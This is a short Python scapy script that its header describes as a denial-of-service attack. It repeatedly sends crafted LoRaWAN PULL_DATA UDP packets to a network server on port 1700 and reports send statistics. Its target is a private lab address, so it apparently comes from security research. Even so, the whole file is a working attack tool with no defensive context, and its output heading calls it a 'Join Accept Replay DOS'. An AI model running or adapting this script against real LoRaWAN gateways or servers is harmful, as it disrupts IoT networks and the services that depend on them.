#Denial of Service Attack Script that sends mutiple PULL_DATA headers to the Network Server 

import sys
import time
from scapy.all import *

# Define the destination address and port
dest_addr = '192.168.56.104'
dest_port = 1700

# Define the PULL_DATA payload as a string of hexadecimal characters

payloadx = '02c0ad02b4562d94afcda48d'

# Convert the payload to binary format using the bytes.fromhex() method

payload = bytes.fromhex(payloadx)

# Define the IP and UDP headers
ip = IP(dst=dest_addr)
udp = UDP(dport=dest_port)

# Construct the packet by combining the headers and payload
packet = ip / udp / payload

num_times = int(sys.argv[1])

# Get the start time
start_time = time.time()

# Send the packet to the destination IP address and port the specified number of times
for i in range(num_times):
    send(packet) 
    time.sleep(0.5)

# Get the end time
end_time = time.time()

# Calculate the total execution time
execution_time = end_time - start_time

# Calculate the transmission rate
transmission_rate =round(num_times / execution_time,1)

print("Join Accept Replay DOS Statistics")
print(f"Packets sent: {num_times}")
print(f"Start time: {time.ctime(start_time)}")
print(f"End time: {time.ctime(end_time)}")
print(f"Total execution time: {execution_time} seconds")
print(f"Transmission rate: {transmission_rate} packets per second")
